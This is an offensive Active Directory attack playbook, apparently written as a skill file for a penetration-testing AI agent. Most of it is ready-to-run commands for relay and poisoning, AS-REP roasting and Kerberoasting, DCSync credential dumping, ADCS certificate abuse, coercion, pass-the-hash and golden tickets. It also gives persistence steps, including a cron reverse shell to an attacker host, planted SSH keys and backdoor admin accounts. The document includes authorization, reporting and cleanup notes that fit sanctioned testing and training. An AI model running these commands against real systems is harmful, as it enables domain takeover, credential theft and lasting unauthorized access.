# Moraa — Active Directory (attack-path flow)

> This is the orchestration + command flow. For deep per-technique detail (ACL abuse table,
> ESC1-15, delegation, persistence, MDI evasion) read the encyclopedia:
> **`knowledge/offensive/offensive-active-directory.md`** (or invoke the `offensive-active-directory` skill).
> Always relevant per owner's standing instruction. Pivot first (`pivoting.md`) if remote.

---

## The loop (repeat at every privilege level)

```
enum (BloodHound) → find path to higher priv → harvest creds → validate hop → loot → repeat → DA
```

Re-run BloodHound after each new identity you gain — the graph changes.

---

## 1. Foothold with NO creds (from the internal subnet)

```bash
# Host discovery + SMB signing (relay candidates)
nxc smb 10.10.10.0/24
nxc smb 10.10.10.0/24 --gen-relay-list relay.txt

# Null / anonymous
nxc smb DC_IP -u '' -p '' --shares
nxc smb DC_IP -u 'guest' -p '' --users
enum4linux-ng -A DC_IP
ldapsearch -x -H ldap://DC_IP -s base -b "" "(objectclass=*)"

# Poison + relay (no creds → hash → access)
sudo responder -I eth0 -wdF                       # capture NetNTLMv2
# while relaying:
impacket-ntlmrelayx -tf relay.txt -smb2support --no-http-server -i

# AS-REP roast (no creds needed, just usernames)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip DC_IP -no-pass -format hashcat
hashcat -m 18200 asrep.txt rockyou.txt

# Username/password spray (low & slow — watch lockout)
nxc smb DC_IP -u users.txt -p 'Season2026!' --continue-on-success
```

## 2. First valid creds → full enum

```bash
# BloodHound collection (Linux, no Windows host)
bloodhound-python -d corp.local -u USER -p PASS -ns DC_IP -c All --zip
#   then import .zip into BloodHound GUI → run "Shortest paths to Domain Admins",
#   "Find principals with DCSync", "Kerberoastable users", mark owned nodes.

nxc smb DC_IP -u USER -p PASS --users --groups --pass-pol --shares
nxc ldap DC_IP -u USER -p PASS --kerberoasting kerb.txt
nxc ldap DC_IP -u USER -p PASS --asreproast asrep.txt
```

## 3. Credential harvesting paths

```bash
# Kerberoast (SPN accounts → crack offline)
impacket-GetUserSPNs corp.local/USER:PASS -dc-ip DC_IP -request -outputfile tgs.txt
hashcat -m 13100 tgs.txt rockyou.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# DCSync (needs replication rights — Domain Admin, or granted via WriteDacl)
impacket-secretsdump corp.local/USER:PASS@DC_IP -just-dc-user krbtgt
impacket-secretsdump corp.local/USER:PASS@DC_IP -just-dc          # full domain

# LSASS / SAM on a host you own (see privesc-windows.md), parse:
pypykatz lsa minidump lsass.dmp
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

## DCSync — AD credential extraction (deep dive)

> Internal/AD track. Load when you hold an account with directory-replication rights (Domain Admins,
> Enterprise Admins, Administrators, or any principal granted **DS-Replication-Get-Changes** +
> **DS-Replication-Get-Changes-All**). DCSync impersonates a DC and pulls password hashes (incl krbtgt)
> without touching the DC's disk. Pairs with `credential-access.md`, `lateral-movement.md`.

### Do I have the rights?
```bash
# BloodHound: look for "DCSync" / GetChangesAll edge to the domain object from a principal you control.
# nxc / powerview check:
nxc ldap DC -u user -p pass -M daclcheck                     # or:
Get-ObjectAcl -DistinguishedName "dc=corp,dc=local" -ResolveGUIDs | ? {$_.ObjectAceType -match 'Replication-Get-Changes'}
```
> A **non-admin** with those two extended rights (often misconfigured/delegated) = DCSync = domain
> compromise. That's the high-value finding: hunt the ACL, don't assume you need DA.

### Perform DCSync
```bash
# Impacket (from Linux/pivot) — one user:
impacket-secretsdump -just-dc-user krbtgt corp.local/user:'Pass'@DC_IP
# whole domain (all hashes) + NTDS + kerberos keys:
impacket-secretsdump corp.local/user:'Pass'@DC_IP -just-dc
# with hash (PtH) or ticket:
impacket-secretsdump -hashes :NTLM corp.local/user@DC_IP -just-dc
impacket-secretsdump -k -no-pass corp.local/user@DC.corp.local -just-dc
# nxc:
nxc smb DC_IP -u user -p pass --ntds        # dumps NTDS via drsuapi/vss
```
```powershell
# Windows — mimikatz:
lsadump::dcsync /domain:corp.local /user:krbtgt
lsadump::dcsync /domain:corp.local /all /csv
```

### What to grab & why
```
krbtgt hash  → Golden Ticket (forge any TGT, full domain persistence) — see §7 below.
Domain Admin hashes → PtH/PtT to any host (lateral-movement.md).
machine/trust keys → cross-trust attacks ; Silver Tickets (per-service forgery).
all user hashes → offline crack (credential-access.md) / spray.
```
Golden Ticket forging command: §7 below (persistence — use only with authorization; note in report).

### OPSEC / rules
- DCSync uses the replication protocol → looks like DC-to-DC traffic; still logged (4662 with the
  replication GUIDs). Note it in the report timeline.
- On engagements: dump what proves impact (krbtgt + a couple of DA hashes), don't exfil the entire
  NTDS unless the scope requires it. Golden Ticket = persistence — get explicit ok and clean up.
- The reportable *finding* is usually the **misconfigured replication ACL on a non-DA principal**;
  DCSync is the proof. → `findings/` with the ACL + the krbtgt/DA extraction as evidence.

## 4. Escalation paths (what BloodHound hands you)

| BloodHound edge | Action |
|---|---|
| Kerberoastable | crack TGS → that account's rights |
| GenericAll / GenericWrite on user | targeted Kerberoast, or reset password |
| GenericAll on computer | RBCD → S4U → local admin |
| WriteDacl on domain/user | grant self DCSync → secretsdump |
| AddMember on priv group | add self |
| ForceChangePassword | reset victim's password |
| Unconstrained delegation host | coerce DC auth → capture TGT |
| ReadGMSAPassword | read gMSA password |
| ADCS vulnerable template | `certipy` ESC1-15 (see below) |

```bash
# Targeted kerberoast via GenericWrite
pywhisker / set SPN → GetUserSPNs → crack → clear SPN
# RBCD (GenericAll on computer FOO$)
impacket-rbcd -delegate-to 'FOO$' -from 'MYPC$' -action write corp.local/USER:PASS
impacket-getST -spn cifs/foo.corp.local -impersonate Administrator 'corp.local/MYPC$:PASS'
# WriteDacl → DCSync
dacledit.py -action write -rights DCSync -principal USER -target-dn 'DC=corp,DC=local' corp.local/USER:PASS
```

## 5. ADCS (very common DA shortcut)

```bash
certipy find -u USER@corp.local -p PASS -dc-ip DC_IP -vulnerable -stdout
# ESC1: request cert as admin
certipy req -u USER@corp.local -p PASS -ca CORP-CA -template VulnTemplate -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip DC_IP        # → TGT + NT hash
# ESC8: coerce + relay to web enrollment
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs --template DomainController &
PetitPotam.py ATTACKER_IP DC_IP
```

## 6. Coercion (force auth for relay/unconstrained)

```bash
PetitPotam.py -u USER -p PASS ATTACKER_IP DC_IP      # MS-EFSRPC
printerbug.py corp.local/USER:PASS@TARGET ATTACKER_IP
coercer coerce -u USER -p PASS -t TARGET -l ATTACKER_IP
```

## 7. Domain Admin → loot & persist

```bash
# Dump everything
impacket-secretsdump corp.local/Administrator@DC_IP -hashes :NTHASH -just-dc
# PtH to DC
impacket-psexec corp.local/Administrator@DC_IP -hashes :NTHASH
# Golden ticket (krbtgt hash)
impacket-ticketer -nthash KRBTGT_NT -domain-sid S-1-5-21-... -domain corp.local Administrator
# Forest: SID history / trust tickets (see knowledge/offensive/offensive-active-directory.md)
```

## 8. Lateral movement → see `lateral-movement.md` (PtH/PtT/WinRM/WMI/PsExec)

## Persistence & cleanup (local + domain)

> Keep access across reboots/cred-rotation, and leave the environment clean. Authorized
> engagements only. Document every persistence artifact so you can remove it (and report it).

### Track it
Log each persistence artifact to `loot/persistence.md`: host, technique, location/name,
created-at. The report's remediation + the cleanup step both depend on this list.

### Linux persistence
```bash
# SSH key
mkdir -p ~/.ssh; echo 'ATTACKER_PUBKEY' >> ~/.ssh/authorized_keys
# Cron
(crontab -l 2>/dev/null; echo "* * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'") | crontab -
# systemd service / timer, ~/.bashrc, /etc/rc.local, malicious SUID (if root)
# New user (noisy):
useradd -m -s /bin/bash svc && echo 'svc:Pass1!' | chpasswd && usermod -aG sudo svc
```

### Windows (local)
```cmd
:: Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Windows\Temp\s.exe"
:: Scheduled task
schtasks /create /tn Updater /tr "C:\Windows\Temp\s.exe" /sc onlogon /ru SYSTEM /f
:: Service
sc create svcpersist binPath= "C:\Windows\Temp\s.exe" start= auto & sc start svcpersist
:: Local admin user
net user pentest Pass1! /add & net localgroup administrators pentest /add
```

### AD / domain persistence (high-value — Tier 0)
```bash
# Golden Ticket: §7 above (krbtgt NT hash from DCSync)
# Silver Ticket (service acct hash → single service)
impacket-ticketer -nthash SVC_NT -domain-sid SID -spn cifs/host.corp.local -domain corp.local Administrator
# DCSync rights (WriteDacl on domain) / AdminSDHolder ACE / add to Domain Admins
# Diamond/Sapphire ticket = stealthier vs MDI (see knowledge/offensive/offensive-active-directory.md)
```
Credentials persistence: dump krbtgt, all-domain hashes (`-just-dc`), and a couple service
accounts so cred rotation of one user doesn't lock you out.

### Cleanup (end of engagement)
- [ ] Remove every artifact in `loot/persistence.md` (keys, cron, tasks, services, users, tickets).
- [ ] Delete uploaded tools/payloads (`C:\Windows\Temp\*`, `/tmp/*`, web shells in webroot).
- [ ] Remove added ACLs / group memberships / SPNs you set during the attack.
- [ ] Note in the report: what you added, when, and that it was removed (or hand the list to the
      client for verification). Forged tickets persist until krbtgt is rotated **twice** — call
      this out as a remediation step.

### Reporting hook
Persistence findings → `findings/` with severity = Critical when it's domain-level (golden ticket
/ DCSync), and the remediation must include "rotate krbtgt twice" + "audit AdminSDHolder/ACLs".

---

## CPTS engagement cheat-flow

```
pivot in → nxc sweep → responder/relay or AS-REP → first creds
   → bloodhound-python → import → shortest path to DA
   → kerberoast / ACL abuse / ADCS → crack/escalate → validate hop
   → secretsdump → PtH to next host → repeat → DCSync krbtgt → DA
   → document EVERY hop with timestamp + command + output into findings/
```

Mark owned nodes in BloodHound as you go. Save creds/hashes to `loot/` (gitignore mentally —
never into the report verbatim). One finding file per meaningful step.
